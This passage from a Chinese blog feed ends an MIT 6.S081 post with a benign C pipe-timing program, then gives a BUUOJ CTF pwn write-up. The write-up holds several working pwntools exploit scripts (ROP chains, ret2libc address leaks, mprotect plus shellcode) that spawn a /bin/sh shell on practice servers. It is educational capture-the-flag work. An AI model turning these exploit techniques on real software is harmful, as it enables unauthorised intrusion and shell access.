call。从文件系统中移除一个文件的名字。当一个实际的文件没有 <code>link</code> 指向之后，会在所有相关它的进程结束之后从硬盘上彻底抹除～</p><p><code>file utilities</code> 是Unix提供给shel的作为用户态的可调用程序。这个设计允许所有人都可以通过增加新的城区去拓展 <code>command-line</code> 接口。除了 <code>cd</code> ，被写入了shel的源代码中。</p><h2 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h2><p>Write a program that uses UNIX system calls to “ping-pong” a byte between two processes<br>over a pair of pipes, one for each direction. Measure the program’s performance, in exchanges per second.</p><p>我写的代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXCHANGE_NUM 10000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ping <span class="hljs-string">&quot;ping&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pong <span class="hljs-string">&quot;pong&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> pipe_parent_to_child[<span class="hljs-number">2</span>]; <span class="hljs-comment">// parent write, child read;</span><br>    <span class="hljs-type">int</span> pipe_child_to_parent[<span class="hljs-number">2</span>]; <span class="hljs-comment">// child write, parent write;</span><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">5</span>];<br>    pipe(pipe_parent_to_child);<br>    pipe(pipe_child_to_parent);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">start</span>, <span class="hljs-title">end</span>;</span><br>    <span class="hljs-type">double</span> time_diff;<br>    clock_gettime(CLOCK_MONOTONIC, &amp;start);<br>    <span class="hljs-keyword">if</span>(fork() == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// use pipe_child_to_parent[0] &amp; pipe_parent_to_child[1]</span><br>        close(pipe_child_to_parent[<span class="hljs-number">0</span>]);<br>        close(pipe_parent_to_child[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; EXCHANGE_NUM; i++)&#123;<br>            <span class="hljs-keyword">if</span>(write(pipe_child_to_parent[<span class="hljs-number">1</span>], pong, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>)&#123;<br>                perror(<span class="hljs-string">&quot;child write failed!\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(read(pipe_parent_to_child[<span class="hljs-number">0</span>], buf, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>)&#123;<br>                perror(<span class="hljs-string">&quot;child read failed\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No.%d, child read: %s\n&quot;</span>, i, buf);<br>        &#125;<br>        close(pipe_child_to_parent[<span class="hljs-number">1</span>]);<br>        close(pipe_parent_to_child[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        close(pipe_child_to_parent[<span class="hljs-number">1</span>]);<br>        close(pipe_parent_to_child[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; EXCHANGE_NUM; i++)&#123;<br>            <span class="hljs-keyword">if</span>(read(pipe_child_to_parent[<span class="hljs-number">0</span>], buf, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>)&#123;<br>                perror(<span class="hljs-string">&quot;parent read failed\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(write(pipe_parent_to_child[<span class="hljs-number">1</span>], ping, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>)&#123;<br>                perror(<span class="hljs-string">&quot;parent write failed\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No.%d, parent read: %s\n&quot;</span>, i, buf);<br>        &#125;<br>        close(pipe_child_to_parent[<span class="hljs-number">0</span>]);<br>        close(pipe_parent_to_child[<span class="hljs-number">1</span>]);<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    clock_gettime(CLOCK_MONOTONIC, &amp;end);<br>    time_diff = (end.tv_sec - start.tv_sec) + <br>                          (end.tv_nsec - start.tv_nsec) / <span class="hljs-number">1000000000.0</span>;<br>    <span class="hljs-type">double</span> exchange_per_time = time_diff / EXCHANGE_NUM;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The exchange per time: %.8f\n&quot;</span>, exchange_per_time);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>写代码的过程中遇到了几个需要注意的点：</p><ol><li><p><code>wait</code> 针对的是当前进程等待子进程结束。先前理解的类似 <code>sleep</code> 的作用，实则不然。如果要计算时间应该等父子进程全部结束起 来算结束时间。</p></li><li><p><code>fork()</code> 后的父子进程是并发执行的。之前理解的是：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(fork())&#123;<br><span class="hljs-comment">//先执行</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//后执行</span><br>&#125;<br></code></pre></td></tr></table></figure><p> 上面这种理解方式是错误的，哒咩～</p></li></ol><p>ps：</p><p>C语言计算时间是有一套的，抽时间可以去熟悉了解一下 <code>&lt;time.h&gt;</code> ～～～</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>MIT</tag>
      
      <tag>6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buu刷题记录</title>
    <link href="/2025/09/05/buuoj-1/"/>
    <url>/2025/09/05/buuoj-1/</url>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj-level2-x64（2025-8-10）"><a href="#jarvisoj-level2-x64（2025-8-10）" class="headerlink" title="jarvisoj_level2_x64（2025.8.10）"></a>jarvisoj_level2_x64（2025.8.10）</h1><p>看上去是个很简单的栈溢出，有<code>system</code>函数，也有字符串<code>/bin/sh</code></p><span id="more"></span><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:       amd64-64-little<br>RELRO:      No RELRO<br>Stack:      No canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x400000)<br>Stripped:   No<br></code></pre></td></tr></table></figure><p>什么保护也没开，直接溢出就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26368&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>POST = <span class="hljs-built_in">int</span>(POST)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Input:&quot;</span>)<br>pop_rdi_ret_addr = <span class="hljs-number">0x4006b3</span><br>bin_sh = <span class="hljs-number">0x600a90</span><br>system_addr = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x88</span> + p64(pop_rdi_ret_addr) + p64(bin_sh) + p64(system_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>其中用到了ROPgadget，readelf这些工具，其实在IDA里也能直接看，无所谓了</p><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>方法一：<br>这也是我最开始的思路，但是我没做出来。后门函数是<code>get_flag</code>，按理是栈溢出直接返回就行，这里是32位程序，得研究一下这里函数传参的栈溢出返回的具体实现，即参数入栈顺序和栈上结构。</p><p>我直接传了：<code>get_flag_addr + argc1 + argc2</code></p><p>查了一些资料，发现实际上是需要同时传递返回地址的，即：<br><code>get_flag_addr + exit_addr + argc1 + argc2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuo</span><br><span class="hljs-string"></span><br><span class="hljs-string">j.cn:27954&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>POST = <span class="hljs-built_in">int</span>(POST)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>get_flag_addr= <span class="hljs-number">0x080489a0</span><br>a1 = <span class="hljs-number">0x308CD64F</span><br>a2 = <span class="hljs-number">0x195719D1</span><br>exit_addr = <span class="hljs-number">0x804e6a0</span><br>payload = <span class="hljs-number">0x38</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(get_flag_addr) + p32(exit_addr) + p32(a1) + p32(a2)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>方法二：<br>在栈上写<code>shellcode</code>实现控制。这个要求比较高，需要用<code>mprotect</code>函数，以及能够成功在栈上写<code>system(&#39;/bin/sh</code>)才行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27030&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>POST = <span class="hljs-built_in">int</span>(POST)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>mprotect_addr = <span class="hljs-number">0x0806EC80</span><br>write_addr = <span class="hljs-number">0x0806E1B0</span><br>read_addr = <span class="hljs-number">0x0806E140</span><br>bss_addr = <span class="hljs-number">0x080Eb000</span><br>length = <span class="hljs-number">0x2000</span><br>shellcode = asm(shellcraft.sh())<br><span class="hljs-comment"># gdb.attach(p)</span><br>pop_3_ret = <span class="hljs-number">0x0804f460</span><br><span class="hljs-comment">#----------mprotect(bss_addr, len, PROC_EXEC)-----------#</span><br><br><span class="hljs-comment"># payload = b&#x27;a&#x27; * 0x38 + p32(mprotect_addr) + p32(read_addr) + argc1 + argc2 + argc3 + bss_addr + ......</span><br>payload = <span class="hljs-number">0x38</span> * <span class="hljs-string">b&#x27;A&#x27;</span> + p32(mprotect_addr) + p32(pop_3_ret) + p32(bss_addr) + p32(length) + p32(<span class="hljs-number">0x7</span>) <br>payload += p32(read_addr) + p32(bss_addr+<span class="hljs-number">0x1000</span>) + p32(<span class="hljs-number">0</span>) + p32(bss_addr + <span class="hljs-number">0x1000</span>) + p32(<span class="hljs-built_in">len</span>(shellcode)) <br>p.sendline(payload)q<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>这里主要是：32位可执行性程序调用函数是需要通过栈传递参数的，需要连续调用函数的时候，就需要通过<code>pop</code>链将之前栈上的参数手动清空，不然会出现错。上面注释掉的地方就是错误的做法</p><h1 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h1><p>x86_64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26109&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>POST = <span class="hljs-built_in">int</span>(POST)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>pop_rdi_ret = <span class="hljs-number">0x400683</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>一个64位的程序。非常简单的一个栈溢出，简单rop就搞定了</p><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>32位程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29983&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><br>main_addr = <span class="hljs-number">0x08048825</span><br>pop_3_ret = <span class="hljs-number">0x080488f9</span><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>open_got = elf.got[<span class="hljs-string">&#x27;open&#x27;</span>]<br>payload1 = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span> * (<span class="hljs-number">0x20</span>-<span class="hljs-number">2</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;Correct\n&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(pop_3_ret) + p32(<span class="hljs-number">0x1</span>) + p32(write_got) + p32(<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) +p32(<span class="hljs-number">0x1</span>) + p32(open_got) + p32(<span class="hljs-number">0x4</span>)<br>p.sendline(payload2)<br><span class="hljs-comment"># gdb.attach(p)</span><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>).strip().ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>open_addr = u32(p.recv(<span class="hljs-number">4</span>).strip().ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(open_addr))<br>libc_addr = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = libc_addr + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_addr + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>p.sendline(payload1)<br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>) + p32(system_addr) +p32(<span class="hljs-number">0x0</span>) + p32(bin_sh)<br>p.recvuntil(<span class="hljs-string">b&#x27;Correct\n&#x27;</span>)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>一个<code>ret2libc</code>，题目给了libc库，所以就直接用远程的打了。整个逻辑简单。这道题主要学到的是如何绕过<code>strlen()</code></p><p><img src="/images/123.png"><br>这里为了防止程序提前退出，必须绕过<code>strncmp</code>，这里可以选择想办法让<code>v1</code>&#x3D;0，从而让这个函数返回0。因为<code>dev_urandom</code>是系统生成的随机数，我们无法知道其值，从而输入<code>\x00</code>开头的字符串，使得<code>strlen</code>判断其为0。<code>strlen</code>遇到<code>\x00</code>会停下来。</p><blockquote><p>PS：<code>read</code>函数并不会遇到某些字符就停下来，他会一直读取到指定的字节数。</p></blockquote><h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>x86_64<br><img src="/images/20250812151945.png"></p><p>程序中没有<code>system</code>和<code>/bin/sh</code>，可以找<code>libc</code>手打ROP。当然，<code>checksec</code>发现程序并没有开启<code>NX</code>，所以完全可以在<code>read(0, name, 0x64)</code>的时候写入一段shellcode。</p><p>方法一：<code>ret2libc</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26981&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvline()<br>payload_useless = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x63</span><br>p.sendline(payload_useless)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_got = elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>pop_rdi_ret = <span class="hljs-number">0x400713</span><br>main_addr = <span class="hljs-number">0x400636</span><br>p.recvline()<br>p.recvline()<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(main_addr)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gets_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gets_addr))<br><br>libc_addr = puts_addr - <span class="hljs-number">0x809c0</span><br>system = libc_addr + <span class="hljs-number">0x4f440</span><br>bin_sh = libc_addr + <span class="hljs-number">0x1b3e9a</span><br>p.recvline()<br>payload_useless = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">20</span><br>p.sendline(payload_useless)<br>p.recvline()<br>p.recvline()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>也是一个<code>ret2libc</code>。这里是原程序第一步<code>read(0, &amp;buf, 0x64)</code>，然后<code>sendline(payload)</code>的时候不能是0x64，一定要小于这个数，具体是为什么也不清楚。</p><p>方法2:</p><p>在<code>name</code>处写上一段<code>shellcode</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 